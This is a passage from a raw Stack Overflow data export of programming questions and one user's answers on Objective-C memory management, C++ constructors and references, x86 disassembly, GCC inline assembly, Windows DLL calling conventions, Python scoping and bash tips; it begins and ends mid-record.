<p><code>MyClass</code> and <code>drawText</code> are custom classes/methods but you get the idea. These three lines live in <code>drawRect:</code></p>

<p>The first time <code>drawRect:</code> is executed, I see the text as expected. However, on <em>any</em> refresh of drawRect:, the line:</p>

<pre><code>const char *cname = [name UTF8String];
</code></pre>

<p>causes my app to crash with the cryptic, <code>""GDB: Program loaded.""</code> status message.</p>

<p>I get a similar response even when I use the <code>getCString:</code> method.  I think I might be missing a fundamental understanding of NSString to char array conversion.</p>
","9530","","<p>It sounds like you're trying to call methods on an object which has been deallocated already.  The <a href=""http://developer.apple.com/documentation/Cocoa/Reference/Foundation/Classes/NSString%5FClass/Reference/NSString.html#//apple%5Fref/occ/instm/NSString/UTF8String"" rel=""nofollow""><code>UTF8String</code></a> message has the problem that you can't hold onto the returned pointer, since it may become invalidated when the string is released -- you have to copy the string if you need to hold onto it.  However, <code>getCString:maxLength:encoding:</code> does not have that problem.</p>

<p>Make sure you're following properly memory management protocol.  See the <a href=""http://developer.apple.com/documentation/Cocoa/Conceptual/MemoryMgmt/MemoryMgmt.html"" rel=""nofollow"">Memory Management Programming Guide for Cocoa</a>, and double-check that you're sending <code>retain</code>, <code>release</code>, and <code>autorelease</code> messages to the proper objects at the proper times.  Chances are you're sending an extra <code>release</code> or <code>autorelease</code> when you shouldn't be, or you're forgetting to <code>retain</code> your string somewhere.</p>
"
"<p>This is driving me nuts. I just uploaded my first app to the App Store for the first time, and of course, now my app is exploding left and right. When I build with release build configuration, I randomly get an <code>EXC_BAD_ACCESS</code> after banging on the app for some variable amount of time. I turned Zombies back on, but the problem doesn't appear to be over-releasing a variable, as I don't get a message about sending a message to a released variable. </p>

<p>The error does always appear in the same spot in my code. It looks like I'm trying to retain a variable that hasn't been initialized properly. I haven't the slightest idea how I could be doing that. </p>

<p>But here's the weird thing: if I build in debug release configuration, IT NEVER CRASHES. I can bang on the thing all day long, and it's rock solid. I build with Release configuration, and it gets all intermittently crashy.</p>

<p>Looking at the Build settings in the two configurations, there aren't that many differences. In debug, the GCC 4.0 Optimization level is ""None"", while in Release, it's ""Fastest, Smallest."" If I switch the optimization level in Release to ""None,"" the app behaves itself. Does anyone have a clue what I should be looking for to fix this? Alternately, how many bad things happen if I Distribute with No optimization?</p>

<p><strong>UPDATE:</strong></p>

<p>Dang! I really need a magic debug tool for memory errors. I've been working this problem for the last day or so. I added an <code>exercise</code> method that would reliably generate a crash and started looking for the area of code that was causing it. </p>

<p>The app would usually crash the 3rd-5th time I performed one particular type of operation. The only thing that was different about that type of operation was the value I returned from an accessory method. The accessory method generally returned <code>NSDecimalNumber</code>s with values of 0-3, but there was one special case when I was returning an <code>NSDecimalNumber</code> with a non-integer value. I would test the result of the accessory method looking for the non-integer value. I changed the special case to return an <code>NSDecimalNumber</code> with a value of -1 instead of the non-integer value, and I can no longer make the app crash.</p>

<p>Basically, the only change I made was switching from
<code>[[NSNumber numberWithDouble:num] decimalValue]</code> --> crash
to
<code>[[NSNumber numberWithInteger:num] decimalValue]</code> --> no crash</p>

<p>It's a little but more complicated than that, but not much.</p>

<p>Now, I'm happy that the app no longer crashes but the change I made does not fill me with confidence, as the old bits of code did not appear to be ""broken"" in any way. So, while my app doesn't crash anymore, it's not because I ""fixed"" it, I just changed some random thing and now it works. 8^(</p>

<p><strong>UPDATE:</strong></p>

<p>Debugger does not spit out a stack trace as it usually does when a program crashes. When it crashes, the debug console outputs the following:</p>

<p>Loading program into debugger…</p>

<p>[... copyright stuff...]</p>

<pre><code>This GDB was configured as ""i386-apple-darwin"".warning: Unable to read symbols for ""/System/Library/Frameworks/UIKit.framework/UIKit"" (file not found).

warning: Unable to read symbols from ""UIKit"" (not yet mapped into memory).

warning: Unable to read symbols for ""/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics"" (file not found).

warning: Unable to read symbols from ""CoreGraphics"" (not yet mapped into memory).
Program loaded.

sharedlibrary apply-load-rules all

Attaching to program: `/Users/...', process 10066.

Re-enabling shared library breakpoint 1

Cannot access memory at address 0x4

Cannot access memory at address 0x4

(gdb) 
</code></pre>
","9530","","<p>I'd suggest cranking up the warning level on your compiler and see if anything pops up.  Open up your project settings and enable every 'warning' option you can find.  Or, find the project setting named <strong>Other C Flags</strong> and add the flags <code>-Wall -Wextra</code>.</p>

<p>You're going to get a LOT of white noise for things like signed/unsigned mismatches, possible loss of precision, etc., that you can (usually) safely ignore.  However, there may be some key warnings that pop up that you definitely should NOT ignore: things like making a pointer from an integer without a cast (or vice-versa).  If you're not 100% sure you can ignore the warning, fix the code so the warning goes away.</p>
"
"<p>Is <em>nor</em>:</p>

<p>!(a or b)<br />
!a or !b<br />
!(a and b)</p>

<p>something else?</p>
","9530","","<p><code>NOR(a, b)</code> is defined to be <code>NOT(OR(a, b))</code> which is <code>!(a or b)</code> in infix notation.  By <a href=""http://en.wikipedia.org/wiki/De%5FMorgan%27s%5FLaws"" rel=""nofollow"">De Morgan's Laws</a>, this is also equivalent to <code>(!a) and (!b)</code>.</p>
"
"<p>Is there a recommended way to wait on multiple inputs. For example I would like my program to be able to receive input from 3 sources:</p>

<p>Listen on a thread condition e.g. pthread_cond_wait()</p>

<p>Take data from Standard input e.g. getline()</p>

<p>Listen on a socket e.g. accept()</p>

<p>What is the best way to accomplish this? Do I need a thread for each different input source? Thanks</p>
","9530","","<p>You can listen on multiple <em>file descriptors</em> without using multiple threads using the <a href=""http://linux.die.net/man/2/select"" rel=""nofollow""><code>select(2)</code></a> system call.  You can use <a href=""http://www.opengroup.org/onlinepubs/000095399/functions/pthread%5Fcond%5Ftimedwait.html"" rel=""nofollow""><code>pthread_cond_timedwait</code></a> to wait on a condition variable with a timeout, such that you don't wait more than a particular amount of time.</p>

<p>I think it's highly unusual to want to simultaneously wait on either a condition variable or a file descriptor of some sort -- if you're absolutely sure that that's what you want to do, you'll have to use multiple threads, with one thread calling either <code>pthread_cond_wait</code>/<code>pthread_cond_timedwait</code>, and the other thread calling <code>select</code> or some other I/O function.</p>
"
"<p>I am learning a book on data structures, and complied their node in linked list example, and I receive this error:</p>

<pre><code> and Everything.cpp|7|error: expected unqualified-id before ""int""|
 and Everything.cpp|7|error: expected `)' before ""int""|
||=== Build finished: 2 errors, 0 warnings ===|
</code></pre>

<p>The code for the node is:</p>

<pre><code>typedef struct Node
{
    struct Node(int data)    //Compile suggest problem is here
    {
        this-&gt; data = data;
        previous = NULL;
        next = NULL;
    }
    int data;
    struct Node* previous;
    struct Node* next;
} NODE;
</code></pre>

<p>I am not familiar with structs and I am using Code::blocks to compile. Does anyone know whats wrong?</p>
","9530","","<p>The code sample is wrong.  There should not be the keyword <code>struct</code> in front of the constructor declaration.  It should be:</p>

<pre><code>typedef struct Node
{
    Node(int data)  // No 'struct' here
    {
        this-&gt; data = data;
        previous = NULL;
        next = NULL;
    }
    int data;
    struct Node* previous;
    struct Node* next;
} NODE;
</code></pre>
"
"<p>I have a XCode project and I can 'build and debug' with it.
But how can I pass a 'command line switch' so that XCode to invoke with that command line switch when I 'build and debug'?</p>

<p>Thank you.</p>
","9530","","<p>If you want to pass extra compiler flags to the compiler, open up your Project Settings, find the setting named <strong>Other C Flags</strong>, and add your desired compiler switches.</p>
"
"<p>I'm trying to find/write a function that would perform the same operation as <a href=""http://www.mathworks.com/access/helpdesk/help/toolbox/images/index.html?/access/helpdesk/help/toolbox/images/imlincomb.html"" rel=""nofollow"">imlincomb</a>(). However, I am having trouble finding such functions in C++ without using any Matlab API functions other than Intel Performance Primitiives library, and I don't really want to purchase a license for it unless my application really has to take advantage of it. What would be any easy method of implementing it, or perhaps if there are any standard functions that make the job a lot easier?</p>

<p>Thanks in advance.</p>
","9530","","<p>There's definitely nothing of the sort in any standard C++ package.  You might be able to use something in <a href=""http://www.netlib.org/lapack/"" rel=""nofollow"">LAPACK</a>, but I think you'd be better off writing your own.  It's a fairly simple function: each output pixel is independent and depends only on the input pixels at the same coordinates.  In pseudocode:</p>

<pre><code>for each row y in [0, height-1]
    for each column x in [0, width-1]
        for each color channel c in (R, G, B)
            output[y][x][c] = 0
            for each input i
                output[y][x][c] += weight[i] * input[i][y][x][c]
</code></pre>

<p>Of course, the exact formulation depends on how exactly your images are stored (3D array, 2D array, or 1D array, and be careful about the order of your dimensions!).</p>
"
"<p>We are making a Jabber client for our internal use in our company and somehow we need to catch the moment when the user tries to kill the program to actually restart it or just make impossible for the user to kill the client.</p>

<p>Is this possible?</p>

<p>Our Jabber client will be written in C#.</p>

<p>How would I go about accomplishing this?</p>
","9530","","<p>You can't.  You can make it harder, but not impossible.  See <a href=""http://blogs.msdn.com/oldnewthing/archive/2004/02/16/73780.aspx"" rel=""nofollow"">The arms race between programs and users</a>.</p>
"
"<p>When I do this:</p>

<pre><code>std::vector&lt;int&gt; hello;
</code></pre>

<p>Everything works great. However, when I make it a vector of references instead:</p>

<pre><code>std::vector&lt;int &amp;&gt; hello;
</code></pre>

<p>I get horrible errors like ""error C2528: 'pointer' : pointer to reference is illegal"".</p>

<p>I want to put a bunch of references to structs into a vector, so that I don't have to meddle with pointers. Why is vector throwing a tantrum about this? Is my only option to use a vector of pointers instead?</p>
","9530","","<p>It's a flaw in the C++ language.  You can't take the address of a reference, since attempting to do so would result in the address of the object being referred to, and thus you can never get a pointer to a reference.  <code>std::vector</code> works with pointers to its elements, so the values being stored need to be able to be pointed to.  You'll have to use pointers instead.</p>
"
"<p>How to convert a value from nanoseconds to seconds?  </p>

<p>Here's the code segment: </p>

<pre><code>import java.io.*;
import java.util.concurrent.*; 
..

class Stamper { 

public static void main (String[] args) { 
long start = System.nanoTime(); 
//some try with nested loops 
long end = System.nanoTime(); 
long elapsedTime = end - start;

System.out.println(""elapsed: "" + elapsedTime + ""nano seconds\n"");

//convert to seconds 
TimeUnit seconds = new TimeUnit(); 
System.out.println(""which is "" + seconds.toSeconds(elapsedTime) + "" seconds""); 
}}
</code></pre>

<p>The error is </p>

<pre><code>Stamper.java:16:  enum types may not be instantiated.
</code></pre>

<p>What does this mean?</p>
","9530","","<p>Well, you could just divide by 1,000,000,000:</p>

<pre><code>long elapsedTime = end - start;
double seconds = (double)elapsedTime / 1000000000.0;
</code></pre>

<p>If you use <code>TimeUnit</code> to convert, you'll get your result as a long, so you'll lose decimal precision but maintain whole number precision.</p>
"
"<p>I'm interested in writing an x86 dissembler as an educational project.  </p>

<p>The only real resource I have found is Spiral Space's, ""<a href=""http://www.spiralspace.com/Depot/Projects/Disassembler/Default.aspx"">How to write a disassembler</a>"".  While this gives a nice high level description of the various components of a disassembler, I'm interested in some more detailed resources.  I've also taken a quick look at <a href=""http://www.nasm.us/"">NASM's</a> source code but this is somewhat of a heavyweight to learn from.</p>

<p>I realize one of the major challenges of this project is the rather large x86 instruction set I'm going to have to handle.  I'm also interested in basic structure, basic disassembler links, etc.</p>

<p>Can anyone point me to any detailed resources on writing a x86 disassembler?</p>
","9530","","<p>Take a look at <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/s17%5F02.htm"">section 17.2</a> of the <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/toc.htm"">80386 Programmer's Reference Manual</a>.  A disassembler is really just a glorified <a href=""http://en.wikipedia.org/wiki/Finite-state%5Fmachine"">finite-state machine</a>.  The steps in disassembly are:</p>

<ol>
<li>Check if the current byte is an instruction prefix byte (<code>F3</code>, <code>F2</code>, or <code>F0</code>); if so, then you've got a <code>REP</code>/<code>REPE</code>/<code>REPNE</code>/<code>LOCK</code> prefix.  Advance to the next byte.</li>
<li>Check to see if the current byte is an address size byte (<code>67</code>).  If so, decode addresses in the rest of the instruction in 16-bit mode if currently in 32-bit mode, or decode addresses in 32-bit mode if currently in 16-bit mode</li>
<li>Check to see if the current byte is an operand size byte (<code>66</code>).  If so, decode immediate operands in 16-bit mode if currently in 32-bit mode, or decode immediate operands in 32-bit mode if currently in 16-bit mode</li>
<li>Check to see if the current byte is a segment override byte (<code>2E</code>, <code>36</code>, <code>3E</code>, <code>26</code>, <code>64</code>, or <code>65</code>).  If so, use the corresponding segment register for decoding addresses instead of the default segment register.</li>
<li>The next byte is the opcode.  If the opcode is <code>0F</code>, then it is an extended opcode, and read the next byte as the extended opcode.</li>
<li>Depending on the particular opcode, read in and decode a Mod R/M byte, a Scale Index Base (SIB) byte, a displacement (0, 1, 2, or 4 bytes), and/or an immediate value (0, 1, 2, or 4 bytes).  The sizes of these fields depend on the opcode , address size override, and operand size overrides previously decoded.</li>
</ol>

<p>The opcode tells you the operation being performed.  The arguments of the opcode can be decoded form the values of the Mod R/M, SIB, displacement, and immediate value.  There are a lot of possibilities and a lot of special cases, due to the complex nature of x86.  See the links above for a more thorough explanation.</p>
"
"<p>we have a particle detector hard-wired to use 16-bit and 8-bit buffers. Every now and then, there are certain [predicted] peaks of particle fluxes passing through it; that's okay. What is <em>not</em> okay is that these fluxes usually reach magnitudes above the capacity of the buffers to store them; thus, overflows occur. On a chart, they look like the flux suddenly drops and begins growing again. Can you propose a [mostly] accurate method of detecting points of data suffering from an overflow?</p>

<p>P.S. The detector is physically inaccessible, so fixing it the 'right way' by replacing the buffers doesn't seem to be an option.</p>

<p><strong>Update:</strong> Some clarifications as requested. We use python at the data processing facility; the technology used in the detector itself is pretty obscure (treat it as if it was developed by a completely unrelated third party), but it is definitely unsophisticated, i.e. not running a 'real' OS, just some low-level stuff to record the detector readings and to respond to remote commands like power cycle. Memory corruption and other problems are not an issue right now. The overflows occur simply because the designer of the detector used 16-bit buffers for counting the particle flux, and sometimes the flux exceeds 65535 particles per second.</p>

<p><strong>Update 2:</strong> As several readers have pointed out, the intended solution would have something to do with analyzing the flux profile to detect sharp declines (e.g. by an order of magnitude) in an attempt to separate them from normal fluctuations. Another problem arises: can restorations (points where the original flux drops below the overflowing level) be detected by simply running the correction program against the reverted (by the <em>x</em> axis) flux profile?</p>
","9530","","<p>I really don't think you can fix it without fixing the underlying buffers.  How are you supposed to tell the difference between the sequences of values (0, 1, 2, 1, 0) and (0, 1, 65538, 1, 0)?  You can't.</p>
"
"<p>One of the things I'm having a hard time understanding is how the compiler works. I'm having a lot of difficulties with it, but in particular I keep getting headers and libraries mixed up. If somebody could clear things up a bit, that'd be great.</p>
","9530","","<p>A library is code, compiled into a set of object files.  The object files contain the compiled machine code and the data declarations used by the code.</p>

<p>A header file defines the <em>interface</em> to a library: it tells you how to use the library correctly.  In C/C++, a header file gives you a list of function names and how to call those functions: the number and types of parameters they take, the return type, the calling convention, etc.  Header files have a lot of other stuff in them, too, but in the end, what it boils down is a set of rules for calling library code.</p>
"
"<p>I'm partial to using member initialization lists with my constructors... but I've long since forgotten the reasons behind this... </p>

<p>Do you use member initialization lists in your constructors? If so, why? If not, why not? </p>
","9530","","<p>For POD class members, it makes no difference, it's just a matter of style.  For class members which are classes, then it avoids an unnecessary call to a default constructor.  Consider:</p>

<pre><code>class A
{
public:
    A() { x = 0; }
    A(int x_) { x = x_; }
    int x;
};

class B
{
public:
    B()
    {
        a.x = 3;
    }
private:
    A a;
};
</code></pre>

<p>In this case, the constructor for <code>B</code> will call the default constructor for <code>A</code>, and then initialize <code>a.x</code> to 3.  A better way would be for <code>B</code>'s constructor to directly call <code>A</code>'s constructor in the initializer list:</p>

<pre><code>B()
  : a(3)
{
}
</code></pre>

<p>This would only call <code>A</code>'s <code>A(int)</code> constructor and not its default constructor.  In this example, the difference is negligible, but imagine if you will that <code>A</code>'s default constructor did more, such as allocating memory or opening files.  You wouldn't want to do that unnecessarily.</p>

<p>Furthermore, if a class doesn't have a default constructor, or you have a <code>const</code> member variable, you <em>must</em> use an initialize list:</p>

<pre><code>class A
{
public:
    A(int x_) { x = x_; }
    int x;
}

class B
{
public:
    B() : a(3), y(2)  // 'a' and 'y' MUST be initialized in an initializer list;
    {                 // it is an error not to do so
    }
private:
    A a;
    const int y;
};
</code></pre>
"
"<p>I recently discovered 'comint-show-output' in emacs shell mode, which jumps to the first line of shell output, which I find incredibly handy when looking at shell output that exceeds a screen length.  The advantages of this command over scrolling with 'page up' are A) you don't have to scan with your eyes for the first line of the output B) you only have to hit the key combo once (instead of 'page up' a number of times which probably is not known beforehand). </p>

<p>I thought about ending all my commands with '| more' but actually this is not what I want since most of the time, I want to retain all output in the terminal buffer, and I usually want to see the end of the shell output first.</p>

<p>I use OSX. Is there a terminal app (on os x) and shell (on remote linux) combination equivalent (so I can do something similar without using emacs all the time - I know, crazy talk)? I normally use bash, but would be fine with switching shells just for this feature. </p>
","9530","","<p>If you're expecting a lot of output and don't want to run your command twice, you can use <a href=""http://linux.die.net/man/1/tee"" rel=""nofollow""><code>tee(1)</code></a> to fork the output:</p>

<pre><code>my-command | tee /tmp/my-command.log | less
</code></pre>

<p>This will pipe the output to a paginator (<code>less</code>), while simultaneously logging the output to a file (in this case, a file named <code>/tmp/my-command.log</code>).  If you need to review the output after you've quit from <code>less</code>, you can just <code>cat</code> the log file instead of re-running the command.</p>
"
"<p>Copying text from websites via browser, paste into xemacs (21.4) buffer, and tildes, quotes, etc. don't copy correctly. </p>

<p>Example: he’s a dummy -> he\222s a dummy.  </p>

<p>Can YOU copy &amp; paste it without problems? If so, please help - how to config my .emacs to solve this.  Thanks.</p>
","9530","","<p>You're attempting to copy+paste smart quotes into XEmacs.  In this case, <code>'\222'</code> is the octal code for the character RIGHT SINGLE QUOTATION MARK (U+2019) encoded in the code page Windows-1252, which has the character encoding <code>0x92</code>.</p>

<p>XEmacs uses UTF-8 internally, so you'll have to configure the copy+paste to convert from Windows-1252 to UTF-8.  I don't know how to do that.</p>
"
"<p>I see a lot of debate going back and forth on which language to use to develop real-time 3D games, and the general consensus is that C or C++ are the only languages that can offer suitable performance for high-end, system-intensive 3D games. I see a lot of people saying C#, Java or Python are too slow, particularly because of garbage collection. How about Objective C? Does Objective C have automatic garbage collection? What besides Automatic Garbage Collection make a language 'too slow' or unsuited for 3D games? </p>

<p>This question is probably more of a 'thought experiment' since I doubt I'll ever develop a game that is so resource heavy that these questions need to be addressed, but being a programmer, I'm inexplicably obsessed with performance, so I'd still like to know just for my own jollies.</p>
","9530","","<p>Objective-C 2.0 has garbage collection available on Mac OS X 10.5, but it is optional -- you can still compile Objective-C apps without garbage collection if you so choose.  On other platforms (iPhone, Mac OS X pre-10.5, and anything else), there is no garbage collection, and you have to manually manage your memory.</p>

<p>Objective-C is a <em>strict</em> superset of C, so you can code plain C in Objective-C if you want.  Hence, there's no reason not to use Objective-C for games that wouldn't also apply to using C.  You can use the extra features Objective-C provides as much or as little as you want.</p>
"
"<p>I'm having terrible trouble trying to understand python scoping rules.</p>

<p>With the following script:</p>

<pre><code>a = 7

def printA():
    print ""Value of a is %d"" % (a)

def setA(value):
    a = value
    print ""Inside setA, a is now %d"" %(a)


print ""Before setA""
printA()
setA(42)
print ""After setA""
printA()
</code></pre>

<p>Gives the unexpected (to me) output of:</p>

<pre>
    Before setA
    Value of a is 7
    Inside setA, a is now 42
    After setA
    Value of a is 7
</pre>

<p>Where I would expect the last printing of the value of a to be 42, not 7. What am I missing about Python's scope rules for the scoping of global variables?</p>
","9530","","<p>Global variables are special.  If you try to assign to a variable <code>a = value</code> inside of a function, it creates a new local variable inside the function, even if there is a global variable with the same name.  To instead access the global variable, add a <a href=""http://docs.python.org/reference/simple%5Fstmts.html#the-global-statement""><code>global</code> statement</a> inside the function:</p>

<pre><code>a = 7
def setA(value):
    global a   # declare a to be a global
    a = value  # this sets the global value of a
</code></pre>

<p>See also <a href=""http://docs.python.org/reference/executionmodel.html#naming-and-binding"">Naming and binding</a> for a detailed explanation of Python's naming and binding rules.</p>
"
"<p>This question might be off base, but here's the problem I'm having:</p>

<p>I'm trying to run an example from the iPhone SDK, and I'm running into an access violation.  I've traced down some behaviour that I think is suspicious.</p>

<p>Here's what the class looks like:</p>

<pre><code>@interface TableViewCell : UITableViewCell {

@private    
    UILabel *_earthquakeLocationLabel;
    UILabel *_earthquakeDateLabel;
    UILabel *_earthquakeMagnitudeLabel;
    UIImageView *_magnitudeImageView;
}
</code></pre>

<p>When I set a breakpoint in</p>

<pre><code>- (id)initWithFrame:(CGRect)frame reuseIdentifier:(NSString *)reuseIdentifier
</code></pre>

<p>And look at ""self"" in the debugger, it shows that _earthquakeDateLabel is ""0x12"", _earthquakeMagnitudeLabel is 0x1000, and the other two are zero.  If I try to assign to either of the nonzero ones, I get an access violation.</p>

<p>I'm guessing what's happening is that these have bogus values in them, and when I try to assign to them, that tries to decrement a reference on the bogus value and blows up.  But as I said, I'm fairly new to Objective C, so I may be off base.</p>

<p>So my question is, is there anything special about initializing these values that I should be doing?  Or any way to assign to the value when it has a bogus value in it?</p>

<p><hr /></p>

<p>Some additional information:</p>

<p>So if I assign nil to _earthquakeDateLabel and _earthquakeMagnitudeLabel in initialize, that fixes the problem.  But I don't understand why the object is created with values in those fields; I expect them to be nil.  The object is being created on the heap:</p>

<pre><code>TableViewCell *cell = [[[TableViewCell alloc] initWithFrame:CGRectZero reuseIdentifier:MyIdentifier] autorelease];
</code></pre>
","9530","","<p>It sounds like the <code>self</code> pointer is bogus.  The values 0x12 and 0x1000 are integer constants; they're definitely NOT pointers to valid memory addresses.  The fact that you are seeing those values indicates that something is wrong, and attempting to manipulate them in any way (reading or writing them) will result in badness.  In this case, you're getting an access violation because you're trying to write to memory addresses 0x12 and 0x1000, which are invalid addresses.</p>

<p>How are you creating the <code>TableViewCell</code> objects?  Are you doing <code>TableViewCell *myCell = [[TableViewCell alloc] initWithFrame:...]</code>?  That is the correct way.</p>

<p>Now I'm going to invoke my psychic debugger: my <em>guess</em> is that you're forgetting to declare your <code>TableViewCell</code> object with a pointer, i.e. you're declaring it as <code>TableViewCell myCell</code> instead of <code>TableViewCell *myCell</code> (note the presence of the asterisk).  This will create the object on the stack instead of the heap, and as a result, it will have garbage in its data members, instead of zeros.  Objective-C objects, when properly allocated, will have all of their data members initialized to 0 (or <code>NULL</code>, <code>nil</code> or <code>false</code>, depending on the data type) after a successful call to <code>alloc</code>.</p>
"
"<p>When embedding assembly code into a C/C++ program, you can avoid clobbering registers by saving them with a push instruction (or specify clobber list of compiler supports it).</p>

<p>If you are including assembly inline and want to avoid the overhead of pushing and popping clobbered registers, is there a way of letting gcc choose registers for you (e.g. ones it knows have no useful info in them).</p>
","9530","","<p>Yes.  You can specify that you want a particular variable (input or output) to be stored in a register, but you don't have to specify a register.  See <a href=""http://www.ibiblio.org/gferg/ldp/GCC-Inline-Assembly-HOWTO.html"" rel=""nofollow"">this document</a> for a detailed explanation.  Essentially, the inline assembly looks like this:</p>

<pre><code>asm(""your assembly instructions""
      : output1(""=a""),  // I want output1 in the eax register
        output2(""=r""),  // output2 can be in any general-purpose register
        output3(""=q""),  // output3 can be in eax, ebx, ecx, or edx
        output4(""=A"")   // output4 can be in eax or edx
      : /* inputs */
      : /* clobbered registers */
   );
</code></pre>
"
"<p>I'm trying to call some functions in a DLL compiled with (I believe) Visual C++ from my program, which is compiled using GCC.</p>

<p>To call the functions in the DLL, I do a LoadLibrary() on the DLL, and then a GetProcAddress() to get the address of a particular function, which I then call. This function returns a list of pointers to the functions in the DLL I'm to call.</p>

<p>Well, when I try to call those functions, they don't work properly. I ran my program through a debugger, and it looks like the DLL library function is looking for one of the passed arguments at ebp+8, even though GCC has put it at ebp-24.</p>

<p>It looks definitely like a stack issue. What's more, when the GCC program function which calls the DLL function returns, my program crashes -- so something screwey is going on with the stack. Does anyone know what I need to do in order to fix this? I'm not able to access the DLL code.</p>

<p>Also: I tried putting __cdecl and __stdcall before the DLL function definition in my program's source file, but this changes nothing.</p>
","9530","","<p>Looks like a calling convention problem.  Make sure you're putting the calling convention tag in the right place.  With GCC, it should look like this:</p>

<pre><code>typedef int (__stdcall *MyFunctionType)(int arg1, const char *arg2);
MyFunctionType myFunction = (MyFunctionType)GetProcAddress(myModule, ""MyFunction"");
// check for errors...
int x = myFunction(3, ""hello, world!"");
</code></pre>

<p><strong>[EDIT]</strong></p>

<p>Looks like your problem has nothing to do with calling conventions (although getting them right <em>is</em> important).  You're misusing <code>BSTR</code>s -- a <code>BSTR</code> is <em>not</em> a simple <code>char*</code> pointer.  It's a pointer to a Unicode string (<code>wchar_t*</code>), and furthermore, there is a 4-byte length prefix hidden before the first characters of the string.  See <a href=""http://msdn.microsoft.com/en-us/library/ms221069.aspx"" rel=""nofollow"">MSDN</a> for full details.  So, the call to <code>SetLicense()</code> should look like this:</p>

<pre><code>BSTR User = SysAllocString(L"""");  // Not sure if you can use the same object here,
BSTR Key = SysAllocString(L"""");   // that depends on if SetLicense() modifies its
                                  // arguments; using separate objects to be safe
// check for errors, although it's pretty unlikely
(textCapLib.sdk)-&gt;lpVtbl-&gt;SetLicense((textCapLib.sdk), User, Key);
SysFreeString(User);  // Hopefully the SDK doesn't hang on to pointers to these
SysFreeString(Key);   // strings; if it does, you may have to wait until later to
                      // free them
</code></pre>
"
"<p>We're in the final stages of shipping our console game. On the Wii we're having the most problems with memory of course, so we're busy hunting down sloppy coding, packing bits, and so on.</p>

<p>I've done a dump of memory and used strings.exe (from sysinternals) to analyze it, but it's coming up with a lot of gunk like this:</p>

<pre><code>''''$$$$    %%%%
''''$$$$%%%%####&amp;&amp;&amp;&amp;
''''$$$$((((!!!!$$$$''''((((####%%%%$$$$####((((
''))++.-$$%&amp;''))
'')*&gt;BZf8&lt;S]^kgu[faniwkzgukzkzkz
'',,..EDCCEEONNL
</code></pre>

<p>I'm more interested in strings like this:</p>

<pre><code>wood_wide_end.bmp
restroom_stonewall.bmp
</code></pre>

<p>...which mean we're still embedding some kinds of strings that need to be converted to ID's.</p>

<p>So my question is: what are some good ways of finding the stuff that's likely our debug data that we can eliminate?</p>

<p>I can do some rx's to hack off symbols or just search for certain kinds of strings. But what I'd really like to do is get a hold of a standard dictionary file and search my strings file against that. Seems slow if I were to build a big rx with aardvaark|alimony|archetype etc. Or will that work well enough if I do a .NET compiled rx assembly for it?</p>

<p>Looking for other ideas about how to find stuff we want to eliminate as well. Quick and dirty solutions, don't need elegant. Thanks!</p>
","9530","","<p>First, I'd get a good word list.  <a href=""http://www.puzzlers.org/dokuwiki/doku.php?id=solving:wordlists:about:start"" rel=""nofollow"">This NPL page</a> has a good list of word lists of varying sizes and sources.  What I would do is build a hash table of all the words in the word list, and then test each word that is output by <code>strings</code> against the word list.  This is pretty easy to do in Python:</p>

<pre><code>import sys

dictfile = open('your-word-list')
wordlist = frozenset(word.strip() for word in dictfile)
dictfile.close()

for line in sys.stdin:
    # if any word in the line is in our list, print out the whole line
    for word in line.split():
        if word in wordlist:
            print line
            break
</code></pre>

<p>Then use it like this:</p>

<pre><code>strings myexecutable.elf | python myscript.py
</code></pre>

<p>However, I think you're focusing your attention in the wrong place.  Eliminating debug strings has very diminishing returns.  Although eliminating debugging data is a Technical Certification Requirement that Nintendo requires you to do, I don't think they'll bounce you for having a couple of extra strings in your ELF.</p>

<p>Use a profiler and try to identify where you're using the most memory.  Chances are, there will be a way to save huge amounts of memory with little effort if you focus your energy in the right place.</p>
"
"<p>I need a simple program that given a string, returns to me the next one in the alphanumeric ordering (or just the alphabetic ordering).</p>

<pre><code>f(""aaa"")=""aab""
f(""aaZ"")=""aba""
</code></pre>

<p>And so on.</p>

<p>Is there a function for this in one of the modules already?</p>
","9530","","<p>I don't think there's a built-in function to do this.  The following should work:</p>

<pre><code>def next_string(s):
    strip_zs = s.rstrip('z')
    if strip_zs:
        return strip_zs[:-1] + chr(ord(strip_zs[-1]) + 1) + 'a' * (len(s) - len(strip_zs))
    else:
        return 'a' * (len(s) + 1)
</code></pre>

<p>Explanation: you find the last character which is not a <code>z</code>, increment it, and replace all of the characters after it with <code>a</code>'s.  If the entire string is <code>z</code>'s, then return a string of all <code>a</code>'s that is one longer.</p>
"
"<p>Is there a limit to the number of critical sections I can initialize and use?</p>

<p>My app creates a number of (a couple of thousand) objects that need to be thread-safe. If I have a critical section within each, will that use up too many resources? </p>

<p>I thought that because I need to declare my own CRITICAL_SECTION object, I don't waste kernel resources like I would with a Win32 Mutex or Event? But I just have a nagging doubt...?</p>

<p>To be honest, not all those objects probably <em>need</em> to be thread-safe for my application, but the critical section is in some low-level base class in a library, and I do need a couple of thousand of them!</p>

<p>I may have the opportunity to modify this library, so I was wondering if there is any way to lazily create (and then use from then on) the critical section only when I detect the object is being used from a different thread to the one it was created in? Or is this what Windows would do for me?</p>
","9530","","<p>There's no limit to the number of <code>CRITICAL_SECTION</code> <em>structures</em> that you can declare -- they're just POD data structures at the lowest level.  There may be some limit to the number that you can <em>initialize</em> with <a href=""http://msdn.microsoft.com/en-us/library/ms683472%28VS.85%29.aspx"" rel=""nofollow""><code>InitializeCriticalSection()</code></a>.  According to the documentation, it might raise a <code>STATUS_NO_MEMORY</code> exception on Windows 2000/XP/Server 2003, but apparently it's guaranteed to succeed on Vista.  They don't occupy any kernel resources until you initialize them (if they take any at all).</p>

<p>If you find that the <code>STATUS_NO_MEMORY</code> exception is being raised, you can try only initializing the <code>CRITICAL_SECTION</code> for a given object if there's a chance it could be used in a multiple threads.  If you know a particular object will only be used with one thread, set a flag, and then skip all calls to <code>InitializeCriticalSection()</code>, <code>EnterCriticalSection()</code>, <code>LeaveCriticalSection()</code>, and <code>DeleteCriticalSection()</code>.</p>
"
"<p>While I use Linux, I have not yet customized my bash shell, which I use a fair amount.  So, I ask:  What are your favorite customizations you have for bash?</p>
","9530","","<ul>
<li><a href=""http://lifehacker.com/202042/ask-lifehacker--how-do-i-customize-my-command-line-prompt"" rel=""nofollow"">Colorize your command prompt</a></li>
<li><p>Enable some shell options:</p>

<pre><code># Make bash append rather than overwrite the history on disk
shopt -s histappend
# Enable cool globbing wildcards
shopt -s extglob
</code></pre></li>
<li><p>Add some aliases:</p>

